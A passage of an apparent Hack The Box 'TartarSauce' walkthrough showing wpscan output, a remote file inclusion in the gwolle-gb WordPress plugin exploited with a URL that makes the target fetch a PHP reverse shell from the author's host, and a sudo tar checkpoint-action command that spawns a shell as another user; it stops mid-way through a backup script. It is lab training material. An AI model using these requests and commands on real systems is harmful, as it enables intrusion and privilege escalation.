+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Found</span><span class="w"> </span><span class="k">By</span><span class="err">:</span><span class="w"> </span><span class="n">Readme</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Stable</span><span class="w"> </span><span class="n">Tag</span><span class="w"> </span><span class="p">(</span><span class="n">Aggressive</span><span class="w"> </span><span class="n">Detection</span><span class="p">)</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.88</span><span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">akismet</span><span class="o">/</span><span class="n">readme</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Confirmed</span><span class="w"> </span><span class="k">By</span><span class="err">:</span><span class="w"> </span><span class="n">Readme</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">ChangeLog</span><span class="w"> </span><span class="k">Section</span><span class="w"> </span><span class="p">(</span><span class="n">Aggressive</span><span class="w"> </span><span class="n">Detection</span><span class="p">)</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.88</span><span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">akismet</span><span class="o">/</span><span class="n">readme</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
+
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">brute</span><span class="o">-</span><span class="n">force</span><span class="o">-</span><span class="n">login</span><span class="o">-</span><span class="n">protection</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nl">Location</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.88</span><span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">brute</span><span class="o">-</span><span class="n">force</span><span class="o">-</span><span class="n">login</span><span class="o">-</span><span class="n">protection</span><span class="o">/</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Latest</span><span class="w"> </span><span class="nl">Version</span><span class="p">:</span><span class="w"> </span><span class="mf">1.5.3</span><span class="w"> </span><span class="p">(</span><span class="n">up</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="nc">date</span><span class="p">)</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Last</span><span class="w"> </span><span class="nl">Updated</span><span class="p">:</span><span class="w"> </span><span class="mi">2017</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">29</span><span class="nl">T10</span><span class="p">:</span><span class="mi">39</span><span class="err">:</span><span class="mf">00.000</span><span class="n">Z</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nl">Readme</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.88</span><span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">brute</span><span class="o">-</span><span class="n">force</span><span class="o">-</span><span class="n">login</span><span class="o">-</span><span class="n">protection</span><span class="o">/</span><span class="n">readme</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Found</span><span class="w"> </span><span class="k">By</span><span class="err">:</span><span class="w"> </span><span class="n">Known</span><span class="w"> </span><span class="n">Locations</span><span class="w"> </span><span class="p">(</span><span class="n">Aggressive</span><span class="w"> </span><span class="n">Detection</span><span class="p">)</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.88</span><span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">brute</span><span class="o">-</span><span class="n">force</span><span class="o">-</span><span class="n">login</span><span class="o">-</span><span class="n">protection</span><span class="o">/</span><span class="p">,</span><span class="w"> </span><span class="nl">status</span><span class="p">:</span><span class="w"> </span><span class="mi">403</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nl">Version</span><span class="p">:</span><span class="w"> </span><span class="mf">1.5.3</span><span class="w"> </span><span class="p">(</span><span class="mi">100</span><span class="o">%</span><span class="w"> </span><span class="n">confidence</span><span class="p">)</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Found</span><span class="w"> </span><span class="k">By</span><span class="err">:</span><span class="w"> </span><span class="n">Readme</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Stable</span><span class="w"> </span><span class="n">Tag</span><span class="w"> </span><span class="p">(</span><span class="n">Aggressive</span><span class="w"> </span><span class="n">Detection</span><span class="p">)</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.88</span><span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">brute</span><span class="o">-</span><span class="n">force</span><span class="o">-</span><span class="n">login</span><span class="o">-</span><span class="n">protection</span><span class="o">/</span><span class="n">readme</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Confirmed</span><span class="w"> </span><span class="k">By</span><span class="err">:</span><span class="w"> </span><span class="n">Readme</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">ChangeLog</span><span class="w"> </span><span class="k">Section</span><span class="w"> </span><span class="p">(</span><span class="n">Aggressive</span><span class="w"> </span><span class="n">Detection</span><span class="p">)</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.88</span><span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">brute</span><span class="o">-</span><span class="n">force</span><span class="o">-</span><span class="n">login</span><span class="o">-</span><span class="n">protection</span><span class="o">/</span><span class="n">readme</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
+
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">gwolle</span><span class="o">-</span><span class="n">gb</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nl">Location</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.88</span><span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">gwolle</span><span class="o">-</span><span class="n">gb</span><span class="o">/</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Last</span><span class="w"> </span><span class="nl">Updated</span><span class="p">:</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">01</span><span class="nl">T14</span><span class="p">:</span><span class="mi">42</span><span class="err">:</span><span class="mf">00.000</span><span class="n">Z</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nl">Readme</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.88</span><span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">gwolle</span><span class="o">-</span><span class="n">gb</span><span class="o">/</span><span class="n">readme</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">[</span><span class="n">!</span><span class="o">]</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">version</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="k">out</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nc">date</span><span class="p">,</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">latest</span><span class="w"> </span><span class="n">version</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="mf">3.1.9</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Found</span><span class="w"> </span><span class="k">By</span><span class="err">:</span><span class="w"> </span><span class="n">Known</span><span class="w"> </span><span class="n">Locations</span><span class="w"> </span><span class="p">(</span><span class="n">Aggressive</span><span class="w"> </span><span class="n">Detection</span><span class="p">)</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.88</span><span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">gwolle</span><span class="o">-</span><span class="n">gb</span><span class="o">/</span><span class="p">,</span><span class="w"> </span><span class="nl">status</span><span class="p">:</span><span class="w"> </span><span class="mi">200</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nl">Version</span><span class="p">:</span><span class="w"> </span><span class="mf">2.3.10</span><span class="w"> </span><span class="p">(</span><span class="mi">100</span><span class="o">%</span><span class="w"> </span><span class="n">confidence</span><span class="p">)</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Found</span><span class="w"> </span><span class="k">By</span><span class="err">:</span><span class="w"> </span><span class="n">Readme</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Stable</span><span class="w"> </span><span class="n">Tag</span><span class="w"> </span><span class="p">(</span><span class="n">Aggressive</span><span class="w"> </span><span class="n">Detection</span><span class="p">)</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.88</span><span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">gwolle</span><span class="o">-</span><span class="n">gb</span><span class="o">/</span><span class="n">readme</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Confirmed</span><span class="w"> </span><span class="k">By</span><span class="err">:</span><span class="w"> </span><span class="n">Readme</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">ChangeLog</span><span class="w"> </span><span class="k">Section</span><span class="w"> </span><span class="p">(</span><span class="n">Aggressive</span><span class="w"> </span><span class="n">Detection</span><span class="p">)</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.88</span><span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">gwolle</span><span class="o">-</span><span class="n">gb</span><span class="o">/</span><span class="n">readme</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
+
+<span class="o">[</span><span class="n">!</span><span class="o">]</span><span class="w"> </span><span class="k">No</span><span class="w"> </span><span class="n">WPVulnDB</span><span class="w"> </span><span class="n">API</span><span class="w"> </span><span class="n">Token</span><span class="w"> </span><span class="n">given</span><span class="p">,</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">result</span><span class="w"> </span><span class="n">vulnerability</span><span class="w"> </span><span class="k">data</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">been</span><span class="w"> </span><span class="k">output</span><span class="p">.</span><span class="w"></span>
+<span class="o">[</span><span class="n">!</span><span class="o">]</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="k">get</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">free</span><span class="w"> </span><span class="n">API</span><span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="mi">50</span><span class="w"> </span><span class="n">daily</span><span class="w"> </span><span class="n">requests</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">registering</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">wpvulndb</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">users</span><span class="o">/</span><span class="n">sign_up</span><span class="w"></span>
+
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="nl">Finished</span><span class="p">:</span><span class="w"> </span><span class="n">Tue</span><span class="w"> </span><span class="n">Feb</span><span class="w"> </span><span class="mi">11</span><span class="w"> </span><span class="mi">06</span><span class="err">:</span><span class="mi">04</span><span class="err">:</span><span class="mi">15</span><span class="w"> </span><span class="mi">2020</span><span class="w"></span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Requests</span><span class="w"> </span><span class="nl">Done</span><span class="p">:</span><span class="w"> </span><span class="mi">84864</span><span class="w"></span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Cached</span><span class="w"> </span><span class="nl">Requests</span><span class="p">:</span><span class="w"> </span><span class="mi">31</span><span class="w"></span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="k">Data</span><span class="w"> </span><span class="nl">Sent</span><span class="p">:</span><span class="w"> </span><span class="mf">22.509</span><span class="w"> </span><span class="n">MB</span><span class="w"></span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="k">Data</span><span class="w"> </span><span class="nl">Received</span><span class="p">:</span><span class="w"> </span><span class="mf">11.414</span><span class="w"> </span><span class="n">MB</span><span class="w"></span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Memory</span><span class="w"> </span><span class="nl">used</span><span class="p">:</span><span class="w"> </span><span class="mf">296.926</span><span class="w"> </span><span class="n">MB</span><span class="w"></span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Elapsed</span><span class="w"> </span><span class="nc">time</span><span class="err">:</span><span class="w"> </span><span class="mi">00</span><span class="err">:</span><span class="mi">06</span><span class="err">:</span><span class="mi">01</span><span class="w"></span>
+</pre></div>
+
+
+<p>Searchsploit gave me few results but not related to the versions of the plugins I found. I started looking online for some other exploits but no luck. This is where I got stuck for a while but I was sure this was the right path as I read something on a htb forum where people talked about vulnerable wp plugins on tartarsauce. Thus I went back and started looking at the readme files of the plugins and after a while I found this on the <code>gwolle</code> readme:</p>
+<div class="highlight"><pre><span></span><span class="o">==</span> <span class="n">Changelog</span> <span class="o">==</span>
+
+<span class="o">=</span> <span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">10</span> <span class="o">=</span>
+<span class="o">*</span> <span class="mi">2018</span><span class="o">-</span><span class="mi">2</span><span class="o">-</span><span class="mi">12</span>
+<span class="o">*</span> <span class="n">Changed</span> <span class="k">version</span> <span class="k">from</span> <span class="mi">1</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">3</span> <span class="k">to</span> <span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">10</span> <span class="k">to</span> <span class="n">trick</span> <span class="n">wpscan</span> <span class="p">;</span><span class="n">D</span>
+</pre></div>
+
+
+<p>This reminded me a good old lesson that for these kind of activities every small detail is vital!</p>
+<p>Searchsploit found an RFI exploit (38861) for this version of <code>gwolle</code>. This is an extract of the exploit:</p>
+<div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="w"> </span><span class="k">GET</span><span class="w"> </span><span class="k">parameter</span><span class="w"> </span><span class="ss">&quot;abspath&quot;</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">being</span><span class="w"> </span><span class="n">properly</span><span class="w"> </span><span class="n">sanitized</span><span class="w"> </span><span class="k">before</span><span class="w"> </span><span class="n">being</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">PHP</span><span class="w"> </span><span class="n">require</span><span class="p">()</span><span class="w"> </span><span class="k">function</span><span class="p">.</span><span class="w"> </span><span class="n">A</span><span class="w"> </span><span class="n">remote</span><span class="w"> </span><span class="n">attacker</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="k">include</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">named</span><span class="w"> </span><span class="s1">&#39;wp-load.php&#39;</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">arbitrary</span><span class="w"> </span><span class="n">remote</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="k">execute</span><span class="w"> </span><span class="n">its</span><span class="w"> </span><span class="n">content</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">vulnerable</span><span class="w"> </span><span class="n">web</span><span class="w"> </span><span class="n">server</span><span class="p">.</span><span class="w"> </span><span class="ow">In</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="n">so</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">attacker</span><span class="w"> </span><span class="n">needs</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">place</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">malicious</span><span class="w"> </span><span class="s1">&#39;wp-load.php&#39;</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">his</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">document</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">includes</span><span class="w"> </span><span class="n">server</span><span class="s1">&#39;s URL into request:</span>
+
+<span class="s1">http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]</span>
+
+<span class="s1">In order to exploit this vulnerability &#39;</span><span class="n">allow_url_include</span><span class="err">&#39;</span><span class="w"> </span><span class="n">shall</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="mf">1.</span><span class="w"> </span><span class="n">Otherwise</span><span class="p">,</span><span class="w"> </span><span class="n">attacker</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">still</span><span class="w"> </span><span class="k">include</span><span class="w"> </span><span class="k">local</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">also</span><span class="w"> </span><span class="k">execute</span><span class="w"> </span><span class="n">arbitrary</span><span class="w"> </span><span class="n">code</span><span class="p">.</span><span class="w"> </span>
+
+<span class="n">Successful</span><span class="w"> </span><span class="n">exploitation</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">vulnerability</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">lead</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">entire</span><span class="w"> </span><span class="n">WordPress</span><span class="w"> </span><span class="n">installation</span><span class="w"> </span><span class="n">compromise</span><span class="p">,</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">even</span><span class="w"> </span><span class="n">lead</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">entire</span><span class="w"> </span><span class="n">web</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">compromise</span><span class="p">.</span><span class="w"> </span>
+</pre></div>
+
+
+<p>With this in mind, I copied a php webshell from my kali box (/usr/share/laudanum/php/php-reverse-shell.php), I modified the content and updated the IP address (my kali box IP) and a port (I used 443) and renamed it as <strong><em>wp-load.php</em></strong>. I also started a simple HTTP webserver with python in the directory where <strong><em>wp-load.php</em></strong> is located. I then modified the URL to be exactly like this:</p>
+<p><code>http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.2:8000/wp-load.php)</code></p>
+<p>At this stage I activate a netcat listener on port 443 and I launched the URL. I got no shell back as expected. Looking at the python web server I see this:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:/home/user/Documents/htb/boxes/tartarsauce# python -m SimpleHTTPServer </span>
+<span class="err">Serving HTTP on 0.0.0.0 port 8000 ...</span>
+<span class="err">10.10.10.88 - - [11/Feb/2020 06:51:20] code 404, message File not found</span>
+<span class="err">10.10.10.88 - - [11/Feb/2020 06:51:20] &quot;GET /wp-load.phpwp-load.php HTTP/1.0&quot; 404 -</span>
+</pre></div>
+
+
+<p>The file is not found because wp-load.php is appended to the URL so I remove that bit and launched this URL instead</p>
+<p><code>http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.2:8000/</code></p>
+<p>This time it worked!</p>
+<p>I got a simple shell and I used the procedure found in this <a href="http://sittingducks.io/From%20basic%20shell%20to%20fully%20interactive.html">cheatsheet</a> to upgrade to a full interacive pty shell.</p>
+<p>As shown below I got in as the <strong>www-data</strong> user.</p>
+<div class="highlight"><pre><span></span><span class="err">www-data@TartarSauce:/$ cd /home</span>
+<span class="err">www-data@TartarSauce:/home$ ls -l</span>
+<span class="err">total 4</span>
+<span class="err">drwxrw---- 5 onuma onuma 4096 Feb 21  2018 onuma</span>
+<span class="err">www-data@TartarSauce:/home$ cd onuma</span>
+<span class="c">bash: cd: onuma: Permission denied</span>
+</pre></div>
+
+
+<p>Moving to the home directory I see another user (<strong>onuma</strong>) but I am unable to get to his home directory to get the flag because I don't have permissions. I need to find a way to escalate privileges to <strong>onuma</strong>.</p>
+<p>At this stage I decided to run an enumeration script named Linux-Smart-Enumeration (lse) which is similar to the popular LinEnum but unlike it, it tries to gradualy expose the information depending on its importance from a privesc point of view. I downloaded the script in the box first (specifically on /dev/shm since I can write there).</p>
+<p>Analyzing the output I noticed this potentially useful information:</p>
+<div class="highlight"><pre><span></span><span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">sud010</span> <span class="n">Can</span> <span class="n">we</span> <span class="n">list</span> <span class="n">sudo</span> <span class="n">commands</span> <span class="k">without</span> <span class="n">a</span> <span class="n">password</span><span class="o">?</span><span class="p">...................</span> <span class="n">yes</span><span class="o">!</span>               
+<span class="c1">---                                                                                                                                                                                           </span>
+<span class="n">Matching</span> <span class="k">Defaults</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">www</span><span class="o">-</span><span class="k">data</span> <span class="k">on</span> <span class="n">TartarSauce</span><span class="p">:</span>                                         
+    <span class="n">env_reset</span><span class="p">,</span> <span class="n">mail_badpass</span><span class="p">,</span> <span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">sbin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">bin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">bin</span>                                                                         
+
+<span class="k">User</span> <span class="n">www</span><span class="o">-</span><span class="k">data</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="k">on</span> <span class="n">TartarSauce</span><span class="p">:</span>                                                                                                                                  
+    <span class="p">(</span><span class="n">onuma</span><span class="p">)</span> <span class="n">NOPASSWD</span><span class="p">:</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">tar</span>              
+</pre></div>
+
+
+<p>the user <strong>www-data</strong> can run the <code>tar</code> command as <strong>onuma</strong> without password. Let's see what can we do about it.</p>
+<p><a href="https://gtfobins.github.io/">GTFOBins</a> is a great resource to find out about these things, in fact the site contains a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p>
+<p>This is what we can see for <code>tar</code> combined with <code>sudo</code>:</p>
+<p><img alt="" src="../images//tartar-tar-sudo.png"></p>
+<p>We know that in our case we’ll need to run this with as <strong>onuma</strong> so the command will be the following:</p>
+<p><code>sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></p>
+<p>To understand more about the above command, let's break it down:</p>
+<ul>
+<li>The <code>-c</code> option creates a new archive;</li>
+<li>The <code>-f /dev/null</code> option uses the /dev/null black hole;</li>
+<li>The extra <code>/dev/null</code> is the location we’re saving the archive to;</li>
+<li>The <code>--checkpoint=1</code> option tells tar to display progress messages every X records.</li>
+<li>The <code>--checkpoint-action=exec=/bin/sh</code> options tells tar to run /bin/sh at each checkpoint, essentially giving us a shell.</li>
+</ul>
+<p>When I ran the command I get the expected result:</p>
+<div class="highlight"><pre><span></span><span class="err">www-data@TartarSauce:/$ sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</span>
+<span class="c">tar: Removing leading `/&#39; from member names</span>
+<span class="err">$ whoami</span>
+<span class="err">onuma</span>
+</pre></div>
+
+
+<p>Now, I have again a limited shell so again I use the procedure found in this <a href="http://localhost:8000/From%20basic%20shell%20to%20fully%20interactive.html">cheatsheet</a> to upgrade to a full interacive pty shell.</p>
+<p>Running the lse script again and scrutinizing it I noticed the following entry under the <strong>systemd timers</strong> section:</p>
+<div class="highlight"><pre><span></span><span class="err">NEXT                         LEFT         LAST                         PASSED       UNIT                         ACTIVATES</span>
+<span class="err">Wed 2020-02-12 00:57:29 EST  2min 5s left Wed 2020-02-12 00:52:29 EST  2min 54s ago backuperer.timer             backuperer.service              </span>
+</pre></div>
+
+
+<p><code>backuperer</code> does not sound as a standard service and the LEFT and PASSED columns indicate that the service may be running every 5 minutes.</p>
+<p><strong>systemd timers</strong> are basically a way of doing cronjob on systemd services. </p>
+<p>Looking for <strong>backuperer</strong> I found a bash script in <code>/usr/sbin</code>:</p>
+<div class="highlight"><pre><span></span><span class="err">onuma@TartarSauce:/dev/shm$ ls -l /usr/sbin/backuperer</span>
+<span class="err">-rwxr-xr-x 1 root root 1701 Feb 21  2018 /usr/sbin/backuperer</span>
+</pre></div>
+
+
+<p>this is the content of the script:</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/bin/bash</span>
+
+<span class="c1">#-------------------------------------------------------------------------------------</span>
+<span class="c1"># backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ</span>
+<span class="c1"># ONUMA Dev auto backup program</span>
+<span class="c1"># This tool will keep our webapp backed up incase another skiddie defaces us again.</span>
+<span class="c1"># We will be able to quickly restore from a backup in seconds ;P</span>
+<span class="c1">#-------------------------------------------------------------------------------------</span>
+
+<span class="c1"># Set Vars Here</span>
+<span class="nv">basedir</span><span class="o">=</span>/var/www/html
+<span class="nv">bkpdir</span><span class="o">=</span>/var/backups
+<span class="nv">tmpdir</span><span class="o">=</span>/var/tmp
+<span class="nv">testmsg</span><span class="o">=</span><span class="nv">$bkpdir</span>/onuma_backup_test.txt
+<span class="nv">errormsg</span><span class="o">=</span><span class="nv">$bkpdir</span>/onuma_backup_error.txt
